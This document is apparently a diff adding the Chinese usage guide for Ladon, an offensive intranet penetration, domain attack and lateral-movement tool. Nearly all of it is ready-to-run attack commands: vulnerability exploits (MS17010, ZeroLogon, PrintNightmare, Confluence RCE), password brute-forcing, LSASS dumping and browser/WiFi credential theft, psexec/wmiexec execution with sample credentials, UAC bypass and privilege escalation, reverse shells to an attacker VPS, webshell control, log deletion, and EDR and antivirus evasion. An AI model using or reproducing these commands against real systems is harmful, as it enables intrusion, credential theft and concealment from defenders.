@@ -1,0 +1,699 @@
+Ladon大型内网渗透扫描器\域渗透\横向工具，PowerShell模块、Cobalt Strike插件、内存加载、无文件扫描。内含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。12.2版本内置262功能模块,网络资产探测模块30+协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16+包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计25+含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC/EXP快速扩展扫描能力，Ladon支持Cobalt Strike插件化内存加载，无文件扫描内网快速进行横向移动。
+https://github.com/k8gege/Ladon/releases
+https://k8gege.org/Download
+虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手
+只需一或两个参数就可用90%的功能,一个模块相当于一个新工具
+Ladon可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)
+如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用
+Ladon.ps1完美兼容Win7-Win11/2025 PowerShell，不看版本远程加载无文件渗透
+全平台：Linux、MacOS、Windows、路由器、网络设备等OS系统
+https://github.com/k8gege/LadonGo
+实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标
+有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了
+Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧
+还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的
+一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具
+扫描流量小
+程序体积小
+功能丰富强大
+程序简单易用
+插件支持多种语言
+跨平台(Win/Kali/Ubuntu)等
+支持Cobalt Strike插件化
+支持PowerShell无文件渗透
+Exp生成器可一键生成Poc
+多版本适用各种环境
+1 支持指定IP扫描
+2 支持指定域名扫描
+3 支持指定机器名扫描
+4 支持指定C段扫描(ip/24)
+5 支持指定B段扫描(ip/16)
+6 支持指定A段扫描(ip/8)
+7 支持指定URL扫描
+8 支持批量IP扫描(ip.txt)
+9 支持批量C段扫描(ip24.txt)
+10 支持批量C段扫描(ipc.txt)
+11 支持批量B段扫描(ip16.txt)
+12 支持批量URL扫描(url.txt)
+13 支持批量域名扫描(domain.txt)
+14 支持批量机器名扫描(host.txt)
+15 支持批量国家段扫描(cidr.txt)
+16 支持批量字符串列表(str.txt)
+17 支持主机帐密列表(check.txt)
+18 支持用户密码列表(userpass.txt)
+19 支持指定范围C段扫描
+20 支持参数加载自定义DLL（仅限C#）
+21 支持参数加载自定义EXE（仅限C#）
+22 支持参数加载自定义INI配置文件
+23 支持参数加载自定义PowerShell
+24 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)
+25 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)
+26 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)
+27 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等
+28 INI配置支持自定义程序密码爆破
+Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon
+Excel模块功能文档： http://k8gege.org/Ladon/wiki.xlsx
+支持Cmd、Cobalt Strike、PowerShell等内存加载
+Windows版本: .Net、Cobalt Strike、PowerShell
+全系统版本：GO(全平台)、Python(理论上全平台)
+PS: Study方便本地学习使用，完整功能请使用CMD
+默认扫描速度很快，有些WAF或EDR防御很强
+设置几线程都有可能20分钟左右就不能扫了
+bypassEDR模拟人工访问，绕过速度检测策略
+扫描速度较慢，追求速度的愣头青不要使用
+Ladon 10.1.2.8/24 MS17010 bypassEDR
+密码爆破相关模块暂不支持bypassEDR参数
+例子：扫描目标10.1.2段是否存在MS17010漏洞
+单线程：
+Ladon 10.1.2.8/24 MS17010 t=1
+80线程：
+Ladon noping 10.1.2.8/24 MS17010 t=80
+高强度防护下扫描线程设置低一些，F单线程
+Ladon 10.1.2.8/24 MS17010 f=1
+例子：使用8线程扫描目标10.1.2段是否存在MS17010漏洞
+Ladon noping 10.1.2.8/24 MS17010 t=8
+详见：http://k8gege.org/Ladon/proxy.html
+PS：代理工具不支持Socks5，所以必须加noping参数扫描
+不管是Frp还是其它同类工具，最主要是Proxifier等工具不支持ICMP协议
+因为Ladon默认先用ICMP探测存活后，才使用对应模块测试
+所以代理环境下得禁ping扫描，系统ping使用的就是ICMP协议
+CIDR格式：不只是/24/16/8(所有)
+Ladon 192.168.1.8/24 扫描模块
+Ladon 192.168.1.8/16 扫描模块
+Ladon 192.168.1.8/8 扫描模块
+字母格式：仅C段B段A段 顺序排序
+Ladon 192.168.1.8/c 扫描模块
+Ladon 192.168.1.8/b 扫描模块
+Ladon 192.168.1.8/a 扫描模块
+Ladon 192.168.1.50-192.168.1.200 ICMP
+Ladon 192.168.1.30-192.168.50.80 ICMP
+TXT格式
+Ladon ip24.txt ICMP
+Ladon ipc.txt ICMP
+Ladon ip16.txt ICMP
+Ladon cidr.txt ICMP
+Ladon domain.txt ICMP
+Ladon host.txt ICMP
+Ladon 192.168.1.8 WhatCMS 扫描IP
+Ladon 192.168.1.8/24 WhatCMS 扫描C段
+Ladon 192.168.1.8/C WhatCMS 扫描C段
+Ladon 192.168.1.8/B WhatCMS 扫描B段
+Ladon 192.168.1.8/A WhatCMS 扫描A段
+Ladon IP.TXT WhatCMS 扫描IP列表
+Ladon IP24.TXT WhatCMS 扫描C段列表
+Ladon IP16.TXT WhatCMS 扫描B段列表
+Ladon cidr.TXT WhatCMS 扫描整个国家IP段列表
+禁PING扫描<br>
+Ladon noping 192.168.1.8 WhatCMS 扫描IP
+Ladon noping 192.168.1.8/24 WhatCMS 扫描C段
+Ladon url.txt DraytekPoc
+Ladon str.txt DeBase64
+Ladon 192.168.1.8/24 ICMP
+Ladon 192.168.1.8/24 Ping
+如果你认为ping命令通才是存活，可使用这条命令批量
+Ladon 192.168.1.8/24 OnlinePC
+Ladon 192.168.1.8/24 OsInfo
+Ladon 192.168.1.8/24 EthInfo
+Ladon 192.168.1.8/24 OxidInfo
+Ladon 192.168.1.8/24 DnsInfo
+Ladon 192.168.1.8/24 OnlineIP
+Ladon 192.168.1.8/24 MS17010
+Ladon 192.168.1.8/24 SMBGhost
+Ladon 192.168.1.8/24 WebInfo
+Ladon http://192.168.1.8 WebInfo
+Ladon 192.168.1.8/24 WebScan
+Ladon http://192.168.1.8 WebScan
+Ladon 192.168.1.8/24 UrlScan
+Ladon 192.168.1.8/24 SameWeb
+Ladon baidu.com SubDomain
+Ladon baidu.com DomainIP
+Ladon baidu.com HostIP
+Ladon domain.txt DomainIP
+Ladon host.txt HostIP
+Ladon domain.txt Domain2IP
+Ladon host.txt Host2IP
+Ladon AdiDnsDump 192.168.1.8
+Ladon GetDomainIP
+Ladon 192.168.1.8/24 PortScan
+Ladon 192.168.1.8 PortScan 80,445,3389
+Ladon 192.168.1.8/24 CMS
+Ladon 192.168.1.8/24 CmsInfo
+Ladon 192.168.1.8/24 WhatCMS
+Ladon 192.168.1.8/24 CiscoInfo
+Ladon http://192.168.1.8 CiscoInfo
+Ladon EnumMssql
+Ladon EnumShare
+Ladon 192.168.1.8/24 LdapInfo
+Ladon 192.168.1.8/24 FtpInfo
+密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html
+Ladon 192.168.1.8/24 SmbScan
+Ladon 192.168.1.8/24 WmiScan
+Ladon 192.168.1.8/24 LdapScan
+Ladon 192.168.1.8/24 WinrmScan
+Ladon 192.168.1.8/24 SmbHashScan
+Ladon 192.168.1.8/24 WmiHashScan
+Ladon 192.168.1.8/24 SshScan
+Ladon 192.168.1.8:22 SshScan
+Ladon 192.168.1.8/24 MssqlScan
+Ladon 192.168.1.8/24 OracleScan
+Oracle数据库比较特殊，只爆ORCL库会错过很多权限
+详见：http://k8gege.org/Ladon/OracleScan.html
+Ladon 192.168.1.8/24 MysqlScan
+Ladon http://192.168.1.8:7001/console WeblogicScan
+Ladon 192.168.1.8/24 WeblogicScan
+Ladon 192.168.1.8/24 VncScan
+Ladon 192.168.1.8/24 FtpScan
+Ladon 192.168.1.8/24 TomcatScan
+Ladon http://192.168.1.8:8080/manage TomcatScan
+Ladon http://192.168.1.8/login HttpBasicScan
+Ladon ip.txt 401Scan
+Ladon 192.168.1.8/24 NbtScan
+Ladon 192.168.1.8/24 WinrmScan
+Ladon 192.168.1.8/24 DvrScan
+Ladon 192.168.1.8/24 MS17010
+Ladon 192.168.1.8/24 SMBGhost
+Ladon 192.168.1.8/24 WeblogicPoc
+Ladon 192.168.1.8/24 PhpStudyPoc
+Ladon 192.168.1.8/24 ActivemqPoc
+Ladon 192.168.1.8/24 TomcatPoc
+Ladon 192.168.1.8/24 Struts2Poc
+Ladon 192.168.1.8 DraytekPoc
+Ladon 192.168.1.8/24 DraytekPoc
+Ladon 192.168.1.8/24 CVE-2024-55591
+Ladon 192.168.1.8/24 WeblogicExp
+Ladon 192.168.1.8/24 TomcatExp
+Ladon CmdDll x86 calc
+Ladon CmdDll x64 calc
+Ladon CmdDll b64x86 YwBhAGwAYwA=
+Ladon CmdDll b64x64 YwBhAGwAYwA=
+Ladon CVE-2021-40444 MakeCab poc.dll
+Ladon CVE-2021-40444 MakeHtml http://192.168.1.8
+Ladon DraytekExp http://192.168.1.8 whoami
+Ladon ZeroLogon dc.k8gege.org
+Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520
+Ladon ForExec "CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt" 80 "Exploit finnished"
+Ladon wget https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe<br>
+Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar
+Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe
+Ladon 123456 EnHex
+Ladon 313233343536 DeHex
+Ladon 123456 EnBase64
+Ladon MTIzNDU2 DeBase64
+Ladon str.txt DeBase64
+多网卡机器，嗅探对应C段IP
+Ladon FtpSniffer 192.168.1.5
+多网卡机器，嗅探对应C段IP
+Ladon HTTPSniffer 192.168.1.5
+Ladon Sniffer
+Ladon IISpwd
+Ladon WifiPwd
+Ladon FileZillaPwd
+Ladon CVE-2021-36934
+Ladon DumpLsass
+Ladon w
+Ladon whoami
+Ladon GetIP
+Ladon IPinfo
+Ladon GetID
+Ladon Recent
+Ladon UsbLog
+Ladon CheckDoor
+Ladon AutoRun
+Ladon EnumProcess
+Ladon Tasklist
+Ladon cmdline
+Ladon cmdline cmd.exe
+Ladon GetInfo
+Ladon GetInfo2
+Ladon NetVer
+Ladon PSver
+Ladon NetVersion
+Ladon PSversion
+Ladon Ver
+Ladon Version
+Ladon AllVer
+Ladon AllVersion
+Ladon QueryProxy
+Ladon DirList
+Ladon DirList c:\
+Ladon QueryAdmin
+Ladon GetPipe
+Ladon RdpLog
+net use \\192.168.1.8 k8gege520 /user:k8gege
+Ladon psexec 192.168.1.8
+psexec> whoami
+nt authority\system
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p
+Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami
+Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
+Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
+Usage：Ladon JspShell type url pwd cmd
+Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
+Usage：Ladon WebShell ScriptType ShellType url pwd cmd
+Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
+Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
+Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon whoami
+获取系统版本信息 方便提权
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo
+Ladon WmiExec2 host user pass cmd whoami
+Ladon WmiExec2 pth host cmd whoami 先Mimikatz注入Hash，再pth执行命令
+Base64Cmd for Cobalt Strike
+Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
+Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
+Upload:
+Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe
+Ladon WmiExec2 pth host upload beacon.exe ceacon.exe 先Mimikatz注入Hash，再pth执行命令
+Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami
+Ladon SmbExec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p
+Ladon WinrmExec 192.168.1.8 5985 k8gege.org Administrator K8gege520 calc.exe
+Ladon whoami
+用法: Ladon BypassUAC Method Base64Cmd
+Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==
+Ladon BypassUac2 c:\1.exe
+Ladon BypassUac2 c:\1.bat
+Ladon PrintNightmare c:\evil.dll
+Ladon CVE-2021-1675 c:\evil.dll
+Ladon SpoolFool poc.dll
+Ladon CVE-2022-21999 poc.dll
+Ladon GetSystem cmd.exe
+Ladon GetSystem cmd.exe explorer
+Ladon Runas user pass cmd
+Ladon ms16135 whoami >=9.2.1版本移除 911保留
+Ladon BadPotato cmdline
+Ladon SweetPotato cmdline
+Ladon EfsPotato whoami
+Ladon Open3389
+Ladon ActiveAdmin
+Ladon ActiveGuest
+Ladon ReverseTcp 192.168.1.8 4444 nc
+Ladon ReverseTcp 192.168.1.8 4444 shell
+Ladon ReverseTcp 192.168.1.8 4444 meter
+Ladon ReverseHttp 192.168.1.8 4444
+Ladon ReverseHttps 192.168.1.8 4444
+Ladon PowerCat 192.168.1.8 4444 cmd
+Ladon PowerCat 192.168.1.8 4444 psh
+Ladon PowerCat 192.168.1.8 4444 cmd udp
+Ladon PowerCat 192.168.1.8 4444 psh udp
+Ladon netsh add 888 192.168.1.112 22
+VPS监听: Ladon PortTran 8000 338
+目标转发: Ladon PortTran 内网IP 3389 VPS_IP 8000
+本机连接: mstsc VPS_IP:338
+Ladon RdpHijack 3
+Ladon RdpHijack 3 console
+Ladon RegAuto Test c:\123.exe
+Ladon at c:\123.exe
+Ladon at c:\123.exe gui
+Ladon sc c:\123.exe
+Ladon sc c:\123.exe gui
+Ladon sc c:\123.exe auto ServerName
+Ladon 192.168.1.8/24 SnmpInfo
+Ladon 192.168.1.8/24 NbtInfo
+Ladon 192.168.1.8/24 SmbInfo
+Ladon 192.168.1.8/24 WmiInfo
+Ladon 192.168.1.8/24 MssqlInfo
+Ladon 192.168.1.8/24 WinrmInfo
+Ladon 192.168.1.8/24 ExchangeInfo
+Ladon 192.168.1.8/24 RdpInfo
+Ladon EnableDotNet
+Ladon gethtml http://192.168.1.1
+Ladon web 80
+Ladon web 80 dir
+获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg) http://192.168.1.8/ip.txt
+Ladon web 800
+certutil.exe -urlcache -split -f http://192.168.1.8:800/getstr/test123456
+certutil.exe -urlcache -split -f http://192.168.1.110:800/getbase64/k8gege520
+certutil.exe -urlcache -split -fhttp://192.168.1.110:800/debase64/azhnZWdlNTIw
+Ladon 192.168.1.8/24 IsShiro
+Ladon LogDelTomcat access.log 192.168.1.8
+Ladon 192.168.1.8/24 Poc.exe
+Ladon 192.168.1.8/24 *.dll(c#)
+Ladon ReadFile c:\k8.exe 默认1k
+Ladon ReadFile c:\k8.exe 1K
+Ladon ReadFile c:\k8.exe 1024K
+Ladon ReadFile c:\k8.exe 1M
+Ladon SetMzLogonPwd 1
+Ladon SetSignAuth 1
+Ladon ip.txt IP24
+Ladon ip.txt IPC
+Ladon ip.txt IPB
+Ladon url.txt CVE-2022-26134
+Ladon EXP-2022-26134 https://111.123.123.123 id
+Ladon RevShell-2022-26134 TargetURL VpsIP VpsPort
+Ladon RevShell-2022-26134 http://xxx.com:8090 123.123.123.123 4444
+Ladon https://k8gege.org SslInfo
+Ladon k8gege.org SslInfo
+Ladon k8gege.org:443 SslInfo 指定端口
+Ladon noping fbi.gov SslInfo 禁ping探测
+Ladon 192.168.1.1 SslInfo
+Ladon 192.168.1.1:8443 SslInfo
+Ladon ip.txt SslInfo
+Ladon url.txt SslInfo
+Ladon 192.168.1.1/c SslInfo
+Ladon 192.168.1.1/b SslInfo
+Ladon https://k8gege.org WPinfo
+Ladon k8gege.org WPinfo
+Ladon noping fbi.gov WPinfo 禁ping探测
+Ladon 192.168.1.1 WPinfo
+Ladon 192.168.1.1:8443 WPinfo
+Ladon ip.txt WPinfo
+Ladon url.txt WPinfo
+Ladon 192.168.1.1/c WPinfo
+Ladon 192.168.1.1/b WPinfo
+Ladon k8gege.org ExchangeScan
+Ladon 192.168.1.8 ExchangeScan
+Ladon 192.168.1.8、24 ExchangeScan
+Ladon 192.168.1.8 CVE-2022-27925
+Ladon http://zimbra.k8gege.org CVE-2022-27925
+Ladon ip.txt CVE-2022-27925
+Ladon url.txt CVE-2022-27925
+Ladon 192.168.1.1/c CVE-2022-27925
+Ladon 192.168.1.1/b CVE-2022-27925
+Ladon EXP-2022-27925 https://zimbra.k8gege.org poc.zip
+Ladon WebShell jsp ua https://zimbra.k8gege.org pass whoami
+Ladon WebShell jsp ua https://zimbra.k8gege.org pass OSinfo
+Ladon WebShell jsp uab64 https://zimbra.k8gege.org pass whoami
+Ladon IISdoor http://192.168.1.142 whoami
+Ladon IISdoor http://192.168.1.142 SIMPLEPASS whoami
+Ladon FindIP ipc.txt ISVUL.txt (精确搜索)
+Ladon FindIP ipc.txt ISVUL.txt like (模糊搜索)
+Ladon https://192.168.1.8 CiscoPwd
+Ladon url.txt CiscoPwd 批量探测Cisco漏洞并导出用户密码
+Ladon 192.168.1.8 PrinterPoc
+Ladon ip.txt PrinterPoc
+禁ping机器扫描使用noping
+Ladon noping 192.168.1.8 PrinterPoc
+Ladon noping ip.txt PrinterPoc
+Ladon Mac ff-ff-ff-ff-ff-ff
+Ladon Mac 01:00:5e:00:00:16
+Ladon Mac ff5e00885d66
+Ladon 192.168.1.8/24 CiscoScan
+Ladon https://192.168.1.8 CiscoScan
+Ladon ip.txt CiscoScan
+Ladon url.txt CiscoScan
+Ladon noping ip CVE-2011-2523
+Ladon noping ip.txt vsFTPdPoc
+Ladon http://192.168.1.8 WpScan
+Ladon url.txt WpScan
+Ladon 192.168.1.8/24 WpScan http 扫描IP时添加http://
+Ladon https://192.168.1.8 ExchangeVer
+Ladon 192.168.1.8/24 ExchangeVer
+Ladon url.txt ExchangeVer
+Ladon https://192.168.1.8 ExchangePoc
+Ladon https://192.168.1.8 GetHead
+Ladon ip.txt GetHead
+Ladon 192.168.1.8/24 GetHead http 扫描IP时添加http://
+Ladon ip.txt GetHead https 扫描IP时添加https://
+Ladon https://192.168.1.8 GetHtml
+Ladon ip.txt GetHtml
+Ladon 192.168.1.8/24 GetHtml http
+Ladon ip.txt GetHtml https 扫描IP时添加https://
+Ladon https://192.168.1.8 GetDomain
+Ladon ip.txt GetDomain
+Ladon 192.168.1.8/24 GetDomain http
+Ladon ip.txt GetDomain https 扫描IP时添加https://
+Ladon ip.txt TrueIP k8gege.org
+Ladon 192.168.1.8/24 TrueIP k8gege.org
+Ladon ip.txt TrueIP "K8哥哥"
+Ladon 192.168.1.8/24 TrueIP "K8哥哥"
+Ladon FirefoxPwd
+Ladon FirefoxHistory
+Ladon FirefoxCookie
+Ladon40 BypassUAC11 cmd
+Ladon40 BypassUAC11 c:\1.bat
+Ladon40 BypassUAC11 c:\1.exe
+Ladon GetPwd
+Ladon 192.168.1.8 DraytekScan
+Ladon https://192.168.1.8 DraytekScan
+Ladon 192.168.1.8/24 DraytekScan
+Ladon url.txt DraytekScan
+Ladon XshellPwd
+Ladon 192.168.1.8 CVE-2022-40684
+Ladon https://192.168.1.8 CVE-2022-40684
+Ladon 192.168.1.8/24 CVE-2022-40684
+Ladon url.txt CVE-2022-40684
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master info
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master open_cmdshell
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master xp_cmdshell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master r_shell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master ws_shell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master py_cmdshell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master install_clr
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master uninstall_clr
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_exec whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_efspotato whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_badpotato whoami
+Ladon 192.168.1.8 CVE-2018-14847
+Ladon ip.txt CVE-2018-14847
+Ladon 192.168.1.8 ZteScan
+Ladon ip.txt ZteScan
+Ladon http://192.168.1.8 ZteScan
+Ladon url.txt ZteScan
+Ladon https://192.168.1.8 MSNSwitchPwd
+Ladon url.txt MSNSwitchPwd
+Ladon https://192.168.1.8 NetGearPwd
+Ladon url.txt NetGearPwd
+Ladon 192.168.1.8/24 T3Info
+Ladon 192.168.1.8:7001 T3Info
+Ladon http://192.168.1.8:7001 T3Info
+Ladon 192.168.1.8/24 InfoScan
+Ladon 192.168.1.8 InfoScan
+Ladon ip.txt InfoScan
+Ladon 192.168.1.8/24 VulScan
+Ladon 192.168.1.8 PocScan
+Ladon http://192.168.1.8 PocScan
+Ladon 192.168.1.8/24 ExpScan
+Ladon 192.168.1.8 ExpScan
+Ladon http://192.168.1.8 ExpScan
+Ladon 192.168.1.8/24 JoomlaPwd
+Ladon 192.168.1.8 JoomlaPwd
+Ladon http://192.168.1.8 JoomlaPwd
+Ladon url.txt JoomlaPwd
+Ladon 192.168.1.8/24 AllScan
+Ladon 192.168.1.8 AllScan
+Ladon http://192.168.1.8 AllScan
+Ladon https://192.168.1.8 CitrixVer
+Ladon 192.168.1.8/24 CitrixVer
+Ladon url.txt CitrixVer
+Ladon https://192.168.1.8 VmwareVer
+Ladon 192.168.1.8/24 VmwareVer
+Ladon url.txt VcenterVer
+Ladon RunPS -f hello.ps1
+Ladon RunPS -c "echo test"
+Ladon RunPS bypass
+Ladon RunPS default
+Ladon HPreboot 192.168.1.8
+Ladon HPreboot 192.168.1.8 public
+Ladon Clslog
+Ladon 192.168.1.8 ArpInfo
+Ladon 192.168.1.8/24 ArpInfo
+Ladon FtpServer 21
+Ladon Ftp 2121
+Ladon Ftp 2121 admin admin
+Ladon Tcp 8080
+Ladon TcpServer 80
+Ladon UdpServer 8080
+Ladon Udp 161
+Ladon PortForward <localPort> <targetHost> <targetPort>
+Example:
+Ladon PortForward 338 192.168.1.8 3389
+Test: mstsc 127.0.0.1 338
+Ladon https://192.168.1.8 CVE-2022-36537
+Ladon 192.168.1.8/24 CVE-2022-36537
+Ladon url.txt CVE-2022-36537
+Ladon EXP-2022-36537 url
+Ladon EXP-2022-36537 url /WEB-INF/web.xml
+Ladon CloseSMB
+Ladon DisService Spooler
+Ladon DisableService Spooler
+Ladon StopService Spooler
+Ladon OpenTCP 445
+Ladon OpenUDP 161
+Ladon CloseTCP 445
+Ladon CloseUDP 161
+Ladon RunToken explorer cmd.exe
+Ladon RunToken explorer c:\1.bat
+Ladon RunSystem cmd.exe
+Ladon RunUser cmd.exe
+Ladon RunSystem c:\1.exe
+Ladon RunUser cmd.exe
+Ladon RunUser c:\1.exe
+Ladon GodPotato whoami
+Ladon 192.168.1.8/24 HikvisionScan
+Ladon http://192.168.1.8:8080 HikvisionScan
+Ladon url.txt HikvisionScan
+Ladon 192.168.1.8/24 HikvisionPoc
+Ladon http://192.168.1.8:8080 HikvisionPoc
+Ladon url.txt HikvisionPoc
+Ladon HikvisionDecode configurationFile
+Ladon web 800 cmd
+Ladon cmdshell http://192.168.50.2:888 cmd whoami
+浏览器访问 http://192.168.1.8:800/shell?cmd=whoami
+Ladon QueryAdminDomain
+Ladon QueryDomain
+Ladon MndpInfo
+Ladon RouterOS
+Ladon Mikrotik
+Ladon PostShell <method> <url> <pwd> <type> <cmd>
+Ladon PostShell POST http://192.168.50.18/post.jsp tom cmd whoami
+Ladon PostShell POST http://192.168.50.18/post.jsp tom b64cmd d2hvYW1p
+Ladon PostShell POST http://192.168.50.18/post.jsp tom base64 d2hvYW1p
+Ladon PostShell UA http://192.168.50.18/ua.jsp tom cmd whoami
+Ladon PostShell UA http://192.168.50.18/ua.jsp tom b64cmd d2hvYW1p
+Ladon PostShell UA http://192.168.50.18/ua.jsp tom base64 d2hvYW1p
+Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom cmd whoami
+Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom b64cmd d2hvYW1p
+Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom base64 d2hvYW1p
+Ladon PostShell Referer http://192.168.50.18/re.jsp tom cmd whoami
+Ladon PostShell Referer http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p
+Ladon PostShell Referer http://192.168.50.18/re.jsp tom base64 d2hvYW1p
+Ladon PostShell Destination http://192.168.50.18/re.jsp tom cmd whoami
+Ladon PostShell Destination http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p
+Ladon PostShell Destination http://192.168.50.18/re.jsp tom base64 d2hvYW1p
+Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom cmd whoami
+Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p
+Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom base64 d2hvYW1p
+Ladon cmd whoami
+Ladon b64cmd d2hvYW1p
+Ladon LoginLog
+Ladon EventLog
+Ladon RocketMQexp <ip> 10911 <command>
+Ladon RocketMQexp 192.168.1.8 10911 "wget http://192.168.1.8/isvul"
+Ladon BypassAV py xor anyNet.exe
+Ladon McpPotato whoami
+Ladon Exe2Hex 1.exe
+Ladon Exe2B64 1.exe
+Ladon 192.168.1.8/24 ZimbraVer
+Ladon http://192.168.1.8:8080 ZimbraVer
+Ladon url.txt ZimbraVer
+Ladon SharpGPO
+Ladon SharpGPO --Action GetOU
+Ladon SharpGPO --Action GetOU --OUName "IT Support"
+Ladon SharpGPO --Action NewOU --OUName "IT Support"
+Ladon SharpGPO --Action NewOU --OUName "App Dev" --BaseDN "OU=IT Support,DC=testad,DC=com"
+Ladon SharpGPO --Action MoveObject --SrcDN "CN=user01,CN=Users,DC=testad,DC=com" --DstDN "OU=IT Support,DC=testad,DC=com"
+Ladon SharpGPO --Action MoveObject --SrcDN "CN=user01,OU=IT Support,DC=testad,DC=com" --DstDN "CN=Users,DC=testad,DC=com"
+Ladon SharpGPO --Action RemoveOU --OUName "IT Support"
+Ladon SharpGPO --Action RemoveOU --DN "OU=IT Support,DC=testad,DC=com"
+Ladon SharpGPO --Action GetGPO
+Ladon SharpGPO --Action GetGPO --GPOName testgpo
+Ladon SharpGPO --Action NewGPO --GPOName testgpo
+Ladon SharpGPO --Action RemoveGPO --GPOName testgpo
+Ladon SharpGPO --Action RemoveGPO --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8
+Ladon SharpGPO --Action GetGPLink
+Ladon SharpGPO --Action GetGPLink --DN "OU=IT Support,DC=testad,DC=com"
+Ladon SharpGPO --Action GetGPLink --GPOName testgpo
+Ladon SharpGPO --Action GetGPLink --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8
+Ladon SharpGPO --Action NewGPLink --DN "OU=IT Support,DC=testad,DC=com" --GPOName testgpo
+Ladon SharpGPO --Action NewGPLink --DN "OU=IT Support,DC=testad,DC=com" --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8
+Ladon SharpGPO --Action RemoveGPLink --DN "OU=IT Support,DC=testad,DC=com" --GPOName testgpo
+Ladon SharpGPO --Action RemoveGPLink --DN "OU=IT Support,DC=testad,DC=com" --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8
+Ladon SharpGPO --Action GetSecurityFiltering --GPOName testgpo
+Ladon SharpGPO --Action GetSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8
+Ladon SharpGPO --Action NewSecurityFiltering --GPOName testgpo --DomainUser Alice
+Ladon SharpGPO --Action NewSecurityFiltering --GPOName testgpo --DomainGroup "Domain Users"
